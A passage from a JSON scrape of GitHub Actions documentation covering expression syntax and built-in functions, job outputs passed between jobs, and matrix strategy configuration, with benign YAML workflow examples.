        "text": "You need to use specific syntax to tell GitHub to evaluate an expression rather than treat it as a string."
      },
      {
        "type": "paragraph",
        "text": "${{ <expression> }}"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The exception to this rule is when you are using expressions in anifclause, where, optionally, you can usually omit${{and}}. For more information aboutifconditionals, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When creating workflows and actions, you should always consider whether your code might execute untrusted input from possible attackers. Certain contexts should be treated as untrusted input, as an attacker could insert their own malicious content. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example setting an environment variable"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "env:\n  MY_ENV_VAR: ${{ <expression> }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Literals"
      },
      {
        "type": "paragraph",
        "text": "As part of an expression, you can useboolean,null,number, orstringdata types."
      },
      {
        "type": "paragraph",
        "text": "Note that in conditionals, falsy values (false,0,-0,\"\",'',null) are coerced tofalseand truthy (trueand other non-falsy values) are coerced totrue."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example of literals"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "env:\n  myNull: ${{ null }}\n  myBoolean: ${{ false }}\n  myIntegerNumber: ${{ 711 }}\n  myFloatNumber: ${{ -9.2 }}\n  myHexNumber: ${{ 0xff }}\n  myExponentialNumber: ${{ -2.99e-2 }}\n  myString: Mona the Octocat\n  myStringInBraces: ${{ 'It''s open source!' }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Operators"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GitHub ignores case when comparing strings.",
          "steps.<step_id>.outputs.<output_name>evaluates as a string. You need to use specific syntax to tell GitHub to evaluate an expression rather than treat it as a string. For more information, seeAccessing contextual information about workflow runs.",
          "For numerical comparison, thefromJSON()function can be used to convert a string to a number. For more information on thefromJSON()function, seefromJSON."
        ]
      },
      {
        "type": "paragraph",
        "text": "GitHub performs loose equality comparisons."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If the types do not match, GitHub coerces the type to a number. GitHub casts data types to a number using these conversions:TypeResultNull0Booleantruereturns1falsereturns0StringParsed from any legal JSON number format, otherwiseNaN.Note: empty string returns0.ArrayNaNObjectNaN",
          "WhenNaNis one of the operands of any relational comparison (>,<,>=,<=), the result is alwaysfalse. For more information, see theNaN Mozilla docs.",
          "GitHub ignores case when comparing strings.",
          "Objects and arrays are only considered equal when they are the same instance."
        ]
      },
      {
        "type": "paragraph",
        "text": "GitHub offers ternary operator like behaviour that you can use in expressions. By using a ternary operator in this way, you can dynamically set the value of an environment variable based on a condition, without having to write separate if-else blocks for each possible option."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "env:\n  MY_ENV_VAR: ${{ github.ref == 'refs/heads/main' && 'value_for_main_branch' || 'value_for_other_branches' }}"
      },
      {
        "type": "paragraph",
        "text": "In this example, we're using a ternary operator to set the value of theMY_ENV_VARenvironment variable based on whether the GitHub reference is set torefs/heads/mainor not. If it is, the variable is set tovalue_for_main_branch. Otherwise, it is set tovalue_for_other_branches.\nIt is important to note that the first value after the&&must be truthy. Otherwise, the value after the||will always be returned."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Functions"
      },
      {
        "type": "paragraph",
        "text": "GitHub offers a set of built-in functions that you can use in expressions. Some functions cast values to a string to perform comparisons. GitHub casts data types to a string using these conversions:"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "contains"
      },
      {
        "type": "paragraph",
        "text": "contains( search, item )"
      },
      {
        "type": "paragraph",
        "text": "Returnstrueifsearchcontainsitem. Ifsearchis an array, this function returnstrueif theitemis an element in the array. Ifsearchis a string, this function returnstrueif theitemis a substring ofsearch. This function is not case sensitive. Casts values to a string."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example using a string"
      },
      {
        "type": "paragraph",
        "text": "contains('Hello world', 'llo')returnstrue."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example using an object filter"
      },
      {
        "type": "paragraph",
        "text": "contains(github.event.issue.labels.*.name, 'bug')returnstrueif the issue related to the event has a label \"bug\"."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeObject filters."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example matching an array of strings"
      },
      {
        "type": "paragraph",
        "text": "Instead of writinggithub.event_name == \"push\" || github.event_name == \"pull_request\", you can usecontains()withfromJSON()to check if an array of strings contains anitem."
      },
      {
        "type": "paragraph",
        "text": "For example,contains(fromJSON('[\"push\", \"pull_request\"]'), github.event_name)returnstrueifgithub.event_nameis \"push\" or \"pull_request\"."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "startsWith"
      },
      {
        "type": "paragraph",
        "text": "startsWith( searchString, searchValue )"
      },
      {
        "type": "paragraph",
        "text": "ReturnstruewhensearchStringstarts withsearchValue. This function is not case sensitive. Casts values to a string."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example ofstartsWith"
      },
      {
        "type": "paragraph",
        "text": "startsWith('Hello world', 'He')returnstrue."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "endsWith"
      },
      {
        "type": "paragraph",
        "text": "endsWith( searchString, searchValue )"
      },
      {
        "type": "paragraph",
        "text": "ReturnstrueifsearchStringends withsearchValue. This function is not case sensitive. Casts values to a string."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example ofendsWith"
      },
      {
        "type": "paragraph",
        "text": "endsWith('Hello world', 'ld')returnstrue."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "format"
      },
      {
        "type": "paragraph",
        "text": "format( string, replaceValue0, replaceValue1, ..., replaceValueN)"
      },
      {
        "type": "paragraph",
        "text": "Replaces values in thestring, with the variablereplaceValueN. Variables in thestringare specified using the{N}syntax, whereNis an integer. You must specify at least onereplaceValueandstring. There is no maximum for the number of variables (replaceValueN) you can use. Escape curly braces using double braces."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example offormat"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "format('Hello {0} {1} {2}', 'Mona', 'the', 'Octocat')"
      },
      {
        "type": "paragraph",
        "text": "Returns 'Hello Mona the Octocat'."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example escaping braces"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "format('{{Hello {0} {1} {2}!}}', 'Mona', 'the', 'Octocat')"
      },
      {
        "type": "paragraph",
        "text": "Returns '{Hello Mona the Octocat!}'."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "join"
      },
      {
        "type": "paragraph",
        "text": "join( array, optionalSeparator )"
      },
      {
        "type": "paragraph",
        "text": "The value forarraycan be an array or a string. All values inarrayare concatenated into a string. If you provideoptionalSeparator, it is inserted between the concatenated values. Otherwise, the default separator,is used. Casts values to a string."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example ofjoin"
      },
      {
        "type": "paragraph",
        "text": "join(github.event.issue.labels.*.name, ', ')may return 'bug, help wanted'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "toJSON"
      },
      {
        "type": "paragraph",
        "text": "toJSON(value)"
      },
      {
        "type": "paragraph",
        "text": "Returns a pretty-print JSON representation ofvalue. You can use this function to debug the information provided in contexts."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example oftoJSON"
      },
      {
        "type": "paragraph",
        "text": "toJSON(job)might return{ \"status\": \"success\" }"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "fromJSON"
      },
      {
        "type": "paragraph",
        "text": "fromJSON(value)"
      },
      {
        "type": "paragraph",
        "text": "Returns a JSON object or JSON data type forvalue. You can use this function to provide a JSON object as an evaluated expression or to convert any data type that can be represented in JSON or JavaScript, such as strings, booleans, null values, arrays, and objects."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example returning a JSON object"
      },
      {
        "type": "paragraph",
        "text": "This workflow sets a JSON matrix in one job, and passes it to the next job using an output andfromJSON."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: build\non: push\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n    steps:\n      - id: set-matrix\n        run: echo \"matrix={\\\"include\\\":[{\\\"project\\\":\\\"foo\\\",\\\"config\\\":\\\"Debug\\\"},{\\\"project\\\":\\\"bar\\\",\\\"config\\\":\\\"Release\\\"}]}\" >> $GITHUB_OUTPUT\n  job2:\n    needs: job1\n    runs-on: ubuntu-latest\n    strategy:\n      matrix: ${{ fromJSON(needs.job1.outputs.matrix) }}\n    steps:\n      - run: echo \"Matrix - Project ${{ matrix.project }}, Config ${{ matrix.config }}\""
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example returning a JSON data type"
      },
      {
        "type": "paragraph",
        "text": "This workflow usesfromJSONto convert environment variables from a string to a Boolean or integer."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: print\non: push\nenv:\n  continue: true\n  time: 3\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    steps:\n      - continue-on-error: ${{ fromJSON(env.continue) }}\n        timeout-minutes: ${{ fromJSON(env.time) }}\n        run: echo ..."
      },
      {
        "type": "paragraph",
        "text": "The workflow uses thefromJSON()function to convert the environment variablecontinuefrom a string to a boolean, allowing it to determine whether to continue-on-error or not. Similarly, it converts thetimeenvironment variable from a string to an integer, setting the timeout for the job in minutes."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "hashFiles"
      },
      {
        "type": "paragraph",
        "text": "hashFiles(path)"
      },
      {
        "type": "paragraph",
        "text": "Returns a single hash for the set of files that matches thepathpattern. You can provide a singlepathpattern or multiplepathpatterns separated by commas. Thepathis relative to theGITHUB_WORKSPACEdirectory and can only include files inside of theGITHUB_WORKSPACE. This function calculates an individual SHA-256 hash for each matched file, and then uses those hashes to calculate a final SHA-256 hash for the set of files. If thepathpattern does not match any files, this returns an empty string. For more information about SHA-256, seeSHA-2."
      },
      {
        "type": "paragraph",
        "text": "You can use pattern matching characters to match file names. Pattern matching forhashFilesfollows glob pattern matching and is case-insensitive on Windows. For more information about supported pattern matching characters, see thePatternssection in the@actions/globdocumentation."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Examples with a single pattern"
      },
      {
        "type": "paragraph",
        "text": "Matches anypackage-lock.jsonfile in the repository."
      },
      {
        "type": "paragraph",
        "text": "hashFiles('**/package-lock.json')"
      },
      {
        "type": "paragraph",
        "text": "Matches all.jsfiles in thesrcdirectory at root level, but ignores any subdirectories ofsrc."
      },
      {
        "type": "paragraph",
        "text": "hashFiles('/src/*.js')"
      },
      {
        "type": "paragraph",
        "text": "Matches all.rbfiles in thelibdirectory at root level, including any subdirectories oflib."
      },
      {
        "type": "paragraph",
        "text": "hashFiles('/lib/**/*.rb')"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Examples with multiple patterns"
      },
      {
        "type": "paragraph",
        "text": "Creates a hash for anypackage-lock.jsonandGemfile.lockfiles in the repository."
      },
      {
        "type": "paragraph",
        "text": "hashFiles('**/package-lock.json', '**/Gemfile.lock')"
      },
      {
        "type": "paragraph",
        "text": "Creates a hash for all.rbfiles in thelibdirectory at root level, including any subdirectories oflib, but excluding.rbfiles in thefoosubdirectory."
      },
      {
        "type": "paragraph",
        "text": "hashFiles('/lib/**/*.rb', '!/lib/foo/*.rb')"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Status check functions"
      },
      {
        "type": "paragraph",
        "text": "You can use the following status check functions as expressions inifconditionals. A default status check ofsuccess()is applied unless you include one of these functions. For more information aboutifconditionals, seeWorkflow syntax for GitHub ActionsandMetadata syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "success"
      },
      {
        "type": "paragraph",
        "text": "Returnstruewhen all previous steps have succeeded."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example ofsuccess"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  ...\n  - name: The job has succeeded\n    if: ${{ success() }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "always"
      },
      {
        "type": "paragraph",
        "text": "Causes the step to always execute, and returnstrue, even when canceled. Thealwaysexpression is best used at the step level or on tasks that you expect to run even when a job is canceled. For example, you can usealwaysto send logs even when a job is canceled."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Avoid usingalwaysfor any task that could suffer from a critical failure, for example: getting sources, otherwise the workflow may hang until it times out. If you want to run a job or step regardless of its success or failure, use the recommended alternative:if: ${{ !cancelled() }}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example ofalways"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "if: ${{ always() }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "cancelled"
      },
      {
        "type": "paragraph",
        "text": "Returnstrueif the workflow was canceled."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example ofcancelled"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "if: ${{ cancelled() }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "failure"
      },
      {
        "type": "paragraph",
        "text": "Returnstruewhen any previous step of a job fails. If you have a chain of dependent jobs,failure()returnstrueif any ancestor job fails."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example offailure"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  ...\n  - name: The job has failed\n    if: ${{ failure() }}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "failure with conditions"
      },
      {
        "type": "paragraph",
        "text": "You can include extra conditions for a step to run after a failure, but you must still includefailure()to override the default status check ofsuccess()that is automatically applied toifconditions that don't contain a status check function."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Example offailurewith conditions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  ...\n  - name: Failing step\n    id: demo\n    run: exit 1\n  - name: The demo step has failed\n    if: ${{ failure() && steps.demo.conclusion == 'failure' }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Object filters"
      },
      {
        "type": "paragraph",
        "text": "You can use the*syntax to apply a filter and select matching items in a collection."
      },
      {
        "type": "paragraph",
        "text": "For example, consider an array of objects namedfruits."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "[\n  { \"name\": \"apple\", \"quantity\": 1 },\n  { \"name\": \"orange\", \"quantity\": 2 },\n  { \"name\": \"pear\", \"quantity\": 1 }\n]"
      },
      {
        "type": "paragraph",
        "text": "The filterfruits.*.namereturns the array[ \"apple\", \"orange\", \"pear\" ]."
      },
      {
        "type": "paragraph",
        "text": "You may also use the*syntax on an object. For example, suppose you have an object namedvegetables."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"scallions\":\n  {\n    \"colors\": [\"green\", \"white\", \"red\"],\n    \"ediblePortions\": [\"roots\", \"stalks\"],\n  },\n  \"beets\":\n  {\n    \"colors\": [\"purple\", \"red\", \"gold\", \"white\", \"pink\"],\n    \"ediblePortions\": [\"roots\", \"stems\", \"leaves\"],\n  },\n  \"artichokes\":\n  {\n    \"colors\": [\"green\", \"purple\", \"red\", \"black\"],\n    \"ediblePortions\": [\"hearts\", \"stems\", \"leaves\"],\n  },\n}"
      },
      {
        "type": "paragraph",
        "text": "The filtervegetables.*.ediblePortionscould evaluate to:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "[\n  [\"roots\", \"stalks\"],\n  [\"hearts\", \"stems\", \"leaves\"],\n  [\"roots\", \"stems\", \"leaves\"],\n]"
      },
      {
        "type": "paragraph",
        "text": "Since objects don't preserve order, the order of the output cannot be guaranteed."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "You can usejobs.<job_id>.outputsto create amapof outputs for a job. Job outputs are available to all downstream jobs that depend on this job. For more information on defining job dependencies, seejobs.<job_id>.needs."
      },
      {
        "type": "paragraph",
        "text": "Outputs can be a maximum of 1 MB per job. The total of all outputs in a workflow run can be a maximum of 50 MB. Size is approximated based on UTF-16 encoding."
      },
      {
        "type": "paragraph",
        "text": "Job outputs containing expressions are evaluated on the runner at the end of each job. Outputs containing secrets are redacted on the runner and not sent to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "If an output is skipped because it may contain a secret, you will see the following warning message: \"Skip output{output.Key}since it may contain secret.\" For more information on how to handle secrets, please refer to theExample: Masking and passing a secret between jobs or workflows."
      },
      {
        "type": "paragraph",
        "text": "To use job outputs in a dependent job, you can use theneedscontext. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Defining outputs for a job"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    runs-on: ubuntu-latest\n    # Map a step output to a job output\n    outputs:\n      output1: ${{ steps.step1.outputs.test }}\n      output2: ${{ steps.step2.outputs.test }}\n    steps:\n      - id: step1\n        run: echo \"test=hello\" >> \"$GITHUB_OUTPUT\"\n      - id: step2\n        run: echo \"test=world\" >> \"$GITHUB_OUTPUT\"\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1\n    steps:\n      - env:\n          OUTPUT1: ${{needs.job1.outputs.output1}}\n          OUTPUT2: ${{needs.job1.outputs.output2}}\n        run: echo \"$OUTPUT1 $OUTPUT2\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using Job Outputs in a Matrix Job"
      },
      {
        "type": "paragraph",
        "text": "Matrices can be used to generate multiple outputs of different names. When using a matrix, job outputs will be combined from all jobs inside the matrix."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    runs-on: ubuntu-latest\n    outputs:\n      output_1: ${{ steps.gen_output.outputs.output_1 }}\n      output_2: ${{ steps.gen_output.outputs.output_2 }}\n      output_3: ${{ steps.gen_output.outputs.output_3 }}\n    strategy:\n      matrix:\n        version: [1, 2, 3]\n    steps:\n      - name: Generate output\n        id: gen_output\n        run: |\n          version=\"${{ matrix.version }}\"\n          echo \"output_${version}=${version}\" >> \"$GITHUB_OUTPUT\"\n  job2:\n    runs-on: ubuntu-latest\n    needs: [job1]\n    steps:\n      # Will show\n      # {\n      #   \"output_1\": \"1\",\n      #   \"output_2\": \"2\",\n      #   \"output_3\": \"3\"\n      # }\n      - run: echo '${{ toJSON(needs.job1.outputs) }}'"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Actions does not guarantee the order that matrix jobs will run in. Ensure that the output name is unique, otherwise the last matrix job that runs will override the output value."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About matrix strategies"
      },
      {
        "type": "paragraph",
        "text": "A matrix strategy lets you use variables in a single job definition to automatically create multiple job runs that are based on the combinations of the variables. For example, you can use a matrix strategy to test your code in multiple versions of a language or on multiple operating systems."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a matrix strategy"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.strategy.matrixto define a matrix of different job configurations. Within your matrix, define one or more variables followed by an array of values. For example, the following matrix has a variable calledversionwith the value[10, 12, 14]and a variable calledoswith the value[ubuntu-latest, windows-latest]:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        version: [10, 12, 14]\n        os: [ubuntu-latest, windows-latest]"
      },
      {
        "type": "paragraph",
        "text": "A job will run for each possible combination of the variables. In this example, the workflow will run six jobs, one for each combination of theosandversionvariables."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub will maximize the number of jobs run in parallel depending on runner availability. The order of the variables in the matrix determines the order in which the jobs are created. The first variable you define will be the first job that is created in your workflow run. For example, the above matrix will create the jobs in the following order:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{version: 10, os: ubuntu-latest}",
          "{version: 10, os: windows-latest}",
          "{version: 12, os: ubuntu-latest}",
          "{version: 12, os: windows-latest}",
          "{version: 14, os: ubuntu-latest}",
          "{version: 14, os: windows-latest}"
        ]
      },
      {
        "type": "paragraph",
        "text": "A matrix will generate a maximum of 256 jobs per workflow run. This limit applies to both GitHub-hosted and self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "The variables that you define become properties in thematrixcontext, and you can reference the property in other areas of your workflow file. In this example, you can usematrix.versionandmatrix.osto access the current value ofversionandosthat the job is using. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a single-dimension matrix"
      },
      {
        "type": "paragraph",
        "text": "You can specify a single variable to create a single-dimension matrix."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow defines the variableversionwith the values[10, 12, 14]. The workflow will run three jobs, one for each value in the variable. Each job will access theversionvalue through thematrix.versioncontext and pass the value asnode-versionto theactions/setup-nodeaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        version: [10, 12, 14]\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.version }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a multi-dimension matrix"
      },
      {
        "type": "paragraph",
        "text": "You can specify multiple variables to create a multi-dimensional matrix. A job will run for each possible combination of the variables."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow specifies two variables:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Two operating systems specified in theosvariable",
          "Three Node.js versions specified in theversionvariable"
        ]
      },
      {
        "type": "paragraph",
        "text": "The workflow will run six jobs, one for each combination of theosandversionvariables. Each job will set theruns-onvalue to the currentosvalue and will pass the currentversionvalue to theactions/setup-nodeaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [ubuntu-22.04, ubuntu-20.04]\n        version: [10, 12, 14]\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.version }}"
      },
      {
        "type": "paragraph",
        "text": "A variable configuration in a matrix can be anarrayofobjects."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "matrix:\n  os:\n    - ubuntu-latest\n    - macos-latest\n  node:\n    - version: 14\n    - version: 20\n      env: NODE_OPTIONS=--openssl-legacy-provider"
      },
      {
        "type": "paragraph",
        "text": "This matrix produces 4 jobs with corresponding contexts."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- matrix.os: ubuntu-latest\n  matrix.node.version: 14\n- matrix.os: ubuntu-latest\n  matrix.node.version: 20\n  matrix.node.env: NODE_OPTIONS=--openssl-legacy-provider\n- matrix.os: macos-latest\n  matrix.node.version: 14\n- matrix.os: macos-latest\n  matrix.node.version: 20\n  matrix.node.env: NODE_OPTIONS=--openssl-legacy-provider"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using contexts to create matrices"
      },
      {
        "type": "paragraph",
        "text": "You can use contexts to create matrices. For more information about contexts, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow triggers on therepository_dispatchevent and uses information from the event payload to build the matrix. When a repository dispatch event is created with a payload like the one below, the matrixversionvariable will have a value of[12, 14, 16]. For more information about therepository_dispatchtrigger, seeEvents that trigger workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"event_type\": \"test\",\n  \"client_payload\": {\n    \"versions\": [12, 14, 16]\n  }\n}"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  repository_dispatch:\n    types:\n      - test\n \njobs:\n  example_matrix:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        version: ${{ github.event.client_payload.versions }}\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.version }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Expanding or adding matrix configurations"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.strategy.matrix.includeto expand existing matrix configurations or to add new configurations. The value ofincludeis a list of objects."
      },
      {
        "type": "paragraph",
        "text": "For each object in theincludelist, the key:value pairs in the object will be added to each of the matrix combinations if none of the key:value pairs overwrite any of the original matrix values. If the object cannot be added to any of the matrix combinations, a new matrix combination will be created instead. Note that the original matrix values will not be overwritten, but added matrix values can be overwritten."
      },
      {
        "type": "paragraph",
        "text": "For example, this matrix:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "strategy:\n  matrix:\n    fruit: [apple, pear]\n    animal: [cat, dog]\n    include:\n      - color: green\n      - color: pink\n        animal: cat\n      - fruit: apple\n        shape: circle\n      - fruit: banana\n      - fruit: banana\n        animal: cat"
      },
      {
        "type": "paragraph",
        "text": "will result in six jobs with the following matrix combinations:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{fruit: apple, animal: cat, color: pink, shape: circle}",
          "{fruit: apple, animal: dog, color: green, shape: circle}",
          "{fruit: pear, animal: cat, color: pink}",
          "{fruit: pear, animal: dog, color: green}",
          "{fruit: banana}",
          "{fruit: banana, animal: cat}"
        ]
      },
      {
        "type": "paragraph",
        "text": "following this logic:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{color: green}is added to all of the original matrix combinations because it can be added without overwriting any part of the original combinations.",
          "{color: pink, animal: cat}addscolor:pinkonly to the original matrix combinations that includeanimal: cat. This overwrites thecolor: greenthat was added by the previousincludeentry.",
          "{fruit: apple, shape: circle}addsshape: circleonly to the original matrix combinations that includefruit: apple.",
          "{fruit: banana}cannot be added to any original matrix combination without overwriting a value, so it is added as an additional matrix combination.",
          "{fruit: banana, animal: cat}cannot be added to any original matrix combination without overwriting a value, so it is added as an additional matrix combination. It does not add to the{fruit: banana}matrix combination because that combination was not one of the original matrix combinations."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Expanding configurations"
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow will run four jobs, one for each combination ofosandnode. When the job for theosvalue ofwindows-latestandnodevalue of16runs, an additional variable callednpmwith the value of6will be included in the job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [windows-latest, ubuntu-latest]\n        node: [14, 16]\n        include:\n          - os: windows-latest\n            node: 16\n            npm: 6\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}\n      - if: ${{ matrix.npm }}\n        run: npm install -g npm@${{ matrix.npm }}\n      - run: npm --version"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Adding configurations"
      },
      {
        "type": "paragraph",
        "text": "For example, this matrix will run 10 jobs, one for each combination ofosandversionin the matrix, plus a job for theosvalue ofwindows-latestandversionvalue of17."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [macos-latest, windows-latest, ubuntu-latest]\n        version: [12, 14, 16]\n        include:\n          - os: windows-latest\n            version: 17"
      },
      {
        "type": "paragraph",
        "text": "If you don't specify any matrix variables, all configurations underincludewill run. For example, the following workflow would run two jobs, one for eachincludeentry. This lets you take advantage of the matrix strategy without having a fully populated matrix."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  includes_only:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        include:\n          - site: \"production\"\n            datacenter: \"site-a\"\n          - site: \"staging\"\n            datacenter: \"site-b\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Excluding matrix configurations"
      },
      {
        "type": "paragraph",
        "text": "To remove specific configurations defined in the matrix, usejobs.<job_id>.strategy.matrix.exclude. An excluded configuration only has to be a partial match for it to be excluded. For example, the following workflow will run nine jobs: one job for each of the 12 configurations, minus the one excluded job that matches{os: macos-latest, version: 12, environment: production}, and the two excluded jobs that match{os: windows-latest, version: 16}."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "strategy:\n  matrix:\n    os: [macos-latest, windows-latest]\n    version: [12, 14, 16]\n    environment: [staging, production]\n    exclude:\n      - os: macos-latest\n        version: 12\n        environment: production\n      - os: windows-latest\n        version: 16\nruns-on: ${{ matrix.os }}"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Allincludecombinations are processed afterexclude. This allows you to useincludeto add back combinations that were previously excluded."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Example: Using an output to define two matrices"
      },
      {
        "type": "paragraph",
        "text": "You can use the output from one job to define matrices for multiple jobs."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow demonstrates how to define a matrix of values in one job, use that matrix in a second jobs to produce artifacts, and then consume those artifacts in a third job. Each artifact is associated with a value from the matrix."
      },
      {
        "type": "code",
        "language": "yaml",
